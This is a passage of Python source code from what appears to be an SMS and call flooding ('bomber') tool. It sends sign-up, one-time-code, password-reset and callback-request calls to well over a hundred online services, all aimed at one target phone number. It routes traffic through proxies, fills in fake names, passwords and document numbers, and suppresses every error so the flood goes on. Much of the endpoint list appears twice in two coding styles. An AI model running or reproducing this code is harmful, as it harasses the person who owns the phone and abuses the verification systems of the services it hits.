                logger.debug(requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",json={"FirstName": name, "CellPhone": phone, "Package": "optimal"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+"+phone,"klient_email": email}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ### ## ##")
                requests.get(f"http://mnogomenu.ru/office/password/reset/"+phonee)
            except:
                logger.warning(SMS_ERR)
            try:
                requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": "+"+phone})
            except:
                logger.warning(SMS_ERR)
            try:
                requests.get("https://menza-cafe.ru/system/call_me.php",params={"fio":name, "phone":phone, "phone_number":"1"})
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": phone,"user_info[email]": email,"user_info[password]": password,"user_info[conf_password]": password}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": phone, "do": "phone"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# ### ### ## ##")
                requests.get("https://makimaki.ru/system/callback.php",params={"cb_fio": name,"cb_phone": phonee})
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",data={"data": phone, "metod": "postreg"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code",json={"phone": phone},headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone":phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle",json={"url": "/api/client/phone_verification","method": "POST","data": {"client_id": 5646981, "phone": phone, "alisa_id": 1},"headers": {"Client-Id": 5646981,"Content-Type": "application/x-www-form-urlencoded"}}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://koronapay.com/transfers/online/api/users/otps",data={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone":phone, "Type": 1}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="# (###) ###-##-##")
                logger.debug(requests.post("https://kilovkusa.ru/ajax.php",params={"block": "auth", "action": "send_register_sms_code", "data_type": "json"},data={"phone": phonee }, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone9}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://izi.ua/api/auth/register",json={"phone":"+"+phone,"name":name,"is_terms_accepted":True}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone":phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+## (###) ###-##-##")
                logger.debug(requests.post("https://iqlab.com.ua/session/ajaxregister",data={"cellphone": phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": password,"application": "lkp","login": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999),"DocSeries": randint(5000, 9999),"FirstName": name,"Gender": "M","LastName": name,"SecondName": name,"Phone": phone9,"Email": email}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/",data={"country": "RU","csrfmiddlewaretoken": "","phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+"+phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": phone, "region_code": "RU"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone})
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": phone, "platform": "PISWeb"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.hatimaki.ru/register/",data={"REGISTER[LOGIN]": phone,"REGISTER[PERSONAL_PHONE]": phone,"REGISTER[SMS_CODE]": "","resend-sms": "1","REGISTER[EMAIL]": "","register_submit_button": "Зарегистрироваться"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone9}}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",json={"phone": "+"+phone,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://friendsclub.ru/assets/components/pl/connector.php",data={"casePar": "authSendsms", "MobilePhone": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ###-##-##")
                logger.debug(requests.post("https://foodband.ru/api?call=calls",data={"customerName": name,"phone": phonee,"g-recaptcha-response": ""}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                requests.get("https://foodband.ru/api/",params={"call": "customers/sendVerificationCode","phone": phone9,"g-recaptcha-response": ""})
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.flipkart.com/api/5/user/otp/generate",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},data={"loginId": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.flipkart.com/api/6/user/signup/status",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},json={"loginId": "+"+phone, "supportAllStates": True}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                requests.get("https://findclone.ru/register", params={"phone": "+"+phone})
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ###-##-##")
                logger.debug(requests.post("https://2407.smartomato.ru/account/session",json={"phone": phonee,"g-recaptcha-response": None}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://www.etm.ru/cat/runprog.html",data={"m_phone":phone9,"mode": "sendSms","syf_prog": "clients-services","getSysParam": "yes"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                requests.get("https://api.eldorado.ua/v1/sign/",params={"login": phone,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"})
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+## (###) ###-##-##")
                logger.debug(requests.post("https://e-groshi.com/online/reg",data={"first_name": name,"last_name": name,"third_name": name,"phone": phonee,"password": password,"password2": password}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin",data={"phone_or_email": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://api.easypay.ua/api/auth/register",json={"phone": phone, "password": password}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ###-##-##")
                logger.debug(requests.post("https://api.creditter.ru/confirm/sms/send",json={"phone": phonee,"type": "register"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://clients.cleversite.ru/callback/run.php",data={"siteid": "62731","num":phone,"title": "Онлайн-консультант","referrer": "https://m.cleversite.ru/call"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/", data={}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ###-##-##")
                logger.debug(requests.post("https://cinema5.ru/api/phone_code",data={"phone": phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://api.cian.ru/sms/v1/send-validation-code/",json={"phone": "+"+phone, "type": "authenticateCode"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register",params={"phoneNumber": "+"+phone,},headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"})
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone9, maska="(###)###-##-##")
                logger.debug(requests.post("https://bluefin.moscow/auth/register/",data={"phone": phonee, "sendphone": "Далее"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://app.benzuber.ru/login", data={"phone": "+"+phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ###-##-##")
                logger.debug(requests.post("https://bartokyo.ru/ajax/login.php",data={"user_phone": phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://bamper.by/registration/?step=1",data={"phone": "+"+phone,"submit": "Запросить смс подтверждения","rules": "on"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone9, maska="(###) ###-##-##")
                requests.get("https://avtobzvon.ru/request/makeTestCall",params={"to": phonee})
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ###-##-##")
                logger.debug(requests.post("https://oauth.av.ru/check-phone",json={"phone": phonee}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                logger.debug(requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                phonee=mask(str=phone, maska="+# (###) ###-##-##")
                logger.debug(requests.post("https://apteka.ru/_action/auth/getForm/",data={"form[NAME]": "","form[PERSONAL_GENDER]": "","form[PERSONAL_BIRTHDAY]": "","form[EMAIL]": "","form[LOGIN]": phonee,"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple","utc_offset": "120"}, proxies=proxies, timeout=2))
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-##-##")
                post("https://zoloto585.ru/api/bcard/reg/", json={"name": "", "surname": "", "patronymic": "", "sex": "m", "birthdate": "..", "phone": formatted_phone, "email": "", "city": ""}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone[1:], "8(###)###-##-##")
                post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code", data={"phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-##-##")
                post("https://yaponchik.net/login/login.php", data={"login": "Y", "countdown": "0", "step": "phone", "redirect": "/profile/", "phone": formatted_phone, "code": ""}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://api.iconjob.co/api/auth/verification_code", json={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://cabinet.wi-fi.ru/api/auth/by-sms", data={"msisdn": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://ng-api.webbankir.com/user/v2/create", json={"lastName": "иванов", "firstName": "иван", "middleName": "иванович", "mobilePhone": phone, "email": email, "smsCode": ""}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://passport.twitch.tv/register?trusted_request=true", json={"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": password, "phone_number": phone, "username": name}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://b.utair.ru/api/v1/login/", json={"login": phone, "confirmation_type": "call_code"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "#(###)###-##-##")
                post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action": "auth", "phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635", "User-Agent": generate_user_agent()}, json={"phone": phone})
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635", "User-Agent": generate_user_agent()}, json={"phone": phone})
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://secure.ubki.ua/b2_api_xml/ubki/auth", json={"doc": {"auth": {"mphone": "+" + phone, "bdate": "11.11.1999", "deviceid": "00100", "version": "1.0", "source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json", "User-Agent": generate_user_agent()})
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-##-##")
                post("https://www.top-shop.ru/login/loginByPhone/", data={"phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "8(###)###-##-##")
                post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code", data={"phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": phone9, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://thehive.pro/auth/signup", json={"phone": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post(f"https://msk.tele2.ru/api/validation/number/{phone}", json={"sender": "Tele2"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ### - ## - ##")
                post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php", data={"RECALL": "Y", "BACK_CALL_PHONE": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.tarantino-family.com/wp-admin/admin-ajax.php", data={"action": "callback_phonenumber", "phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://tabasko.su/", data={"IS_AJAX": "Y", "COMPONENT_NAME": "AUTH", "ACTION": "GET_CODE", "LOGIN": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.sushi-profi.ru/api/order/order-call/", json={"phone": phone9, "name": name}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone9, "8(###)###-##-##")
                post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code", data={"phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone9, "8 (###) ###-##-##")
                post("http://sushigourmet.ru/auth", data={"phone": formatted_phone, "stage": 1}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://sushifuji.ru/sms_send_ajax.php", data={"name": "false", "phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                get("https://suandshi.ru/mobile_api/register_mobile_user", params={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone9, "8-###-###-##-##")
                post("https://pizzasushiwok.ru/index.php", data={"mod_name": "registration", "tpl": "restore_password", "phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-##-##")
                get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={"demo_number": "+" + phone, "ajax_demo_send": "1"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://smart.space/api/users/request_confirmation_code/", json={"mobile": "+" + phone, "action": "confirm_mobile"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://shopandshow.ru/sms/password-request/", data={"phone": "+" + phone, "resend": 0}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://shafa.ua/api/v3/graphiql", json={"operationName": "RegistrationSendSms", "variables": {"phoneNumber": "+" + phone}, "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://shafa.ua/api/v3/graphiql", json={"operationName": "sendResetPasswordSms", "variables": {"phoneNumber": "+" + phone}, "query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://sayoris.ru/?route=parse/whats", data={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://api.saurisushi.ru/Sauri/api/v2/auth/login", data={"data": {"login": phone9, "check": True, "crypto": {"captcha": "739699"}}}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://pass.rutube.ru/api/accounts/phone/send-password/", json={"phone": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://rieltor.ua/api/users/register-sms/", json={"phone": phone, "retry": 0}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php", data={"phone": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+#(###)###-##-##")
                post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/", data={"phone": formatted_phone, "alien": "0"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code", params={"number": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+#-###-###-##-##")
                post("https://api.pozichka.ua/v1/registration/send", json={"RegisterSendForm": {"phone": formatted_phone}}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-##-##")
                post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode", data={"phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone9, "8-###-###-##-##")
                post("https://pizzasushiwok.ru/index.php", data={"mod_name": "call_me", "task": "request_call", "name": name, "phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://pizzakazan.com/auth/ajax.php", data={"phone": "+" + phone, "method": "sendCode"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-####")
                post("https://pizza46.ru/ajaxGet.php", data={"phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={"telephone": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+#-###-###-##-##")
                post("https://paylate.ru/registry", data={"mobile": formatted_phone, "first_name": name, "last_name": name, "nick_name": name,  "gender-client": 1, "email": email, "action": "registry"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode", data={"telephone": "8" + phone9}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", json={"phone": phone, "otpId": 0}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-####")
                post("https://www.osaka161.ru/local/tools/webstroy.webservice.php", data={"name": "Auth.SendPassword", "params[0]": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://ontaxi.com.ua/api/v2/web/client", json={"country": "UA", "phone": phone[3:]}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone9, "8 (###) ###-##-##")
                get("https://okeansushi.ru/includes/contact.php", params={"call_mail": "1", "ajax": "1", "name": name, "phone": formatted_phone, "call_time": "1", "pravila2": "on"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login", "sessid": "bf70db951f54b837748f69b75a61deb4", "method": "sendCode", "phone": phone, "registration": "N"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.niyama.ru/ajax/sendSMS.php", data={"REGISTER[PERSONAL_PHONE]": phone, "code": "", "sendsms": "Выслать код"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://account.my.games/signup_send_sms/", data={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://auth.multiplex.ua/login", json={"login": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.moyo.ua/identity/registration", data={"firstname": name, "phone": phone, "email": email}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php", data={"name": name, "phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.monobank.com.ua/api/mobapplink/send", data={"phone": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://moneyman.ru/registration_api/actions/send-confirmation-code", data="+" + phone, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://my.modulbank.ru/api/v2/registration/nameAndPhone", json={"FirstName": name, "CellPhone": phone, "Package": "optimal"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://mobileplanet.ua/register", data={"klient_name": name, "klient_phone": "+" + phone, "klient_email": email}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                get("https://my.mistercash.ua/ru/send/sms/registration", params={"number": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                get("https://menza-cafe.ru/system/call_me.php", params={"fio": name, "phone": phone, "phone_number": "1"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html", data={"user_info[fullname]": name, "user_info[phone]": phone, "user_info[email]": email, "user_info[password]": password, "user_info[conf_password]": password}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.menu.ua/kiev/delivery/profile/show-verify.html", data={"phone": phone, "do": "phone"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
